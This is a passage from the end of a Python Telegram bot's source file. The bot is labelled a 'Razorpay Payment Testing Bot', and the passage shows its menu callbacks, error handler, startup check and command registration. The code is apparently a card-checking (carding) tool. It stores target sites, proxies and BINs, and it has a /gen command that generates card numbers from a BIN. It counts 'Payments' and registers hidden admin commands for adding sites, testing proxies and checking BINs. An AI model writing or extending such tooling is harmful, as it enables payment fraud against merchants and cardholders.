        await query.edit_message_text(text, parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[btn(f"{e('cross')} Close","cancel")]]))
        return

    if data == "menu_proxy":
        proxies = await redis.lrange(RK_PROXIES, 0, -1)
        if not proxies:
            text = f"{e('error')} No proxies loaded."
        else:
            text = (f"{e('proxy')} <b>Proxies ({len(proxies)})</b>\n\n"
                    + "\n".join(f"  {i}. <code>{safe(p)}</code>"
                                for i, p in enumerate(proxies, 1)))
        await query.edit_message_text(text, parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[btn(f"{e('cross')} Close","cancel")]]))
        return

    if data == "menu_bins":
        bins = await redis.lrange(RK_BINS, 0, -1)
        if not bins:
            text = f"{e('error')} No BINs loaded."
        else:
            text = (f"{e('bin')} <b>BINs ({len(bins)})</b>\n\n"
                    + "\n".join(f"  {i}. <code>{safe(b)}</code>"
                                for i, b in enumerate(bins, 1)))
        await query.edit_message_text(text, parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[btn(f"{e('cross')} Close","cancel")]]))
        return

    if data == "menu_stats":
        sites   = await redis.llen(RK_SITES)
        proxies = await redis.llen(RK_PROXIES)
        bins    = await redis.llen(RK_BINS)
        gen     = await redis.hget(RK_STATS, "total_generated") or "0"
        pays    = await redis.hget(RK_STATS, "total_payments")  or "0"
        await query.edit_message_text(
            f"{e('stats')} <b>Live Stats</b>\n\n"
            f"  {e('site')} Sites:     <code>{sites}</code>\n"
            f"  {e('proxy')} Proxies:  <code>{proxies}</code>\n"
            f"  {e('bin')} BINs:      <code>{bins}</code>\n"
            f"  {e('card')} Generated: <code>{gen}</code>\n"
            f"  {e('money')} Payments: <code>{pays}</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[btn(f"{e('cross')} Close","cancel")]]))
        return

    if data == "info_main":
        await query.edit_message_text(
            f"{e('info')} <b>Bot Info</b>\n\n"
            f"  {e('fire')} v4.0  |  {e('tds')} Redis Upstash\n"
            f"  {e('proxy')} 4 proxy formats\n"
            f"  {e('card')} Real Razorpay testing\n"
            f"  {e('shield')} Hidden commands\n"
            f"  {e('bolt')} Batched: {BATCH_SIZE}/batch",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[btn(f"{e('cross')} Close","cancel")]]))
        return

    if data in ("gen_help", "help_public", "split_help"):
        await query.edit_message_text(
            f"{e('card')} <b>/gen BIN amount</b> — Generate cards\n"
            f"  <code>/gen 411111 100</code>\n\n"
            f"{e('mass')} <b>/split N</b> — Reply to .txt to split",
            parse_mode=ParseMode.HTML,
            reply_markup=main_keyboard())
        return



# ═══════════════════════════════════════════════════
#          ERROR HANDLER
# ═══════════════════════════════════════════════════

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error(f"Unhandled exception: {context.error}", exc_info=context.error)
    if isinstance(update, Update) and update.effective_message:
        try:
            await update.effective_message.reply_text(
                f"{e('error')} An internal error occurred. Please try again.",
                parse_mode=ParseMode.HTML)
        except Exception:
            pass


# ═══════════════════════════════════════════════════
#          STARTUP HEALTH CHECK
# ═══════════════════════════════════════════════════

async def post_init(app) -> None:
    """Run on bot startup — verify Redis connection."""
    try:
        await redis.set("bot:heartbeat", str(int(time.time())))
        val = await redis.get("bot:heartbeat")
        logger.info(f"Redis connected — heartbeat: {val}")

        sites   = await redis.llen(RK_SITES)
        proxies = await redis.llen(RK_PROXIES)
        bins    = await redis.llen(RK_BINS)
        sudos   = len(await redis.smembers(RK_SUDO))
        logger.info(
            f"Loaded — sites:{sites}  proxies:{proxies}  bins:{bins}  sudo:{sudos}")
    except Exception as ex:
        logger.error(f"Redis startup check failed: {ex}")


# ═══════════════════════════════════════════════════
#                 MAIN
# ═══════════════════════════════════════════════════

def main() -> None:
    logger.info("╔══════════════════════════════════════╗")
    logger.info("║  Razorpay Payment Testing Bot v4.0   ║")
    logger.info("╚══════════════════════════════════════╝")

    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .build()
    )

    # ── Public commands (authorized users only, but no /bhosade leak) ──
    app.add_handler(CommandHandler("start",      cmd_start))
    app.add_handler(CommandHandler("gen",        cmd_gen))
    app.add_handler(CommandHandler("split",      cmd_split))
    app.add_handler(CommandHandler("help",       cmd_help))
    app.add_handler(CommandHandler("info",       cmd_info))

    # ── Hidden / admin commands ──
    app.add_handler(CommandHandler("bhosade",    cmd_bhosade))    # silently ignored if not auth
    app.add_handler(CommandHandler("sudo",       cmd_sudo))
    app.add_handler(CommandHandler("unsudo",     cmd_unsudo))
    app.add_handler(CommandHandler("sudolist",   cmd_sudolist))
    app.add_handler(CommandHandler("addsite",    cmd_addsite))
    app.add_handler(CommandHandler("live",       cmd_live))
    app.add_handler(CommandHandler("checksite",  cmd_checksite))
    app.add_handler(CommandHandler("rmsite",     cmd_rmsite))
    app.add_handler(CommandHandler("addpxy",     cmd_addpxy))
    app.add_handler(CommandHandler("proxy",      cmd_proxy))
    app.add_handler(CommandHandler("testpxy",    cmd_testpxy))
    app.add_handler(CommandHandler("rmpxy",      cmd_rmpxy))
    app.add_handler(CommandHandler("clrpxy",     cmd_clrpxy))
    app.add_handler(CommandHandler("addbim",     cmd_addbim))
    app.add_handler(CommandHandler("chkbim",     cmd_chkbim))
    app.add_handler(CommandHandler("rmbin",      cmd_rmbin))
    app.add_handler(CommandHandler("binlookup",  cmd_binlookup))
    app.add_handler(CommandHandler("fuck",       cmd_fuck))
    app.add_handler(CommandHandler("stop",       cmd_stop))
    app.add_handler(CommandHandler("stats",      cmd_stats))

    app.add_handler(CallbackQueryHandler(callbacks))
    app.add_error_handler(error_handler)

    logger.info(f"Admin UID: {ADMIN_USER_ID}")
    logger.info("Starting polling…")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
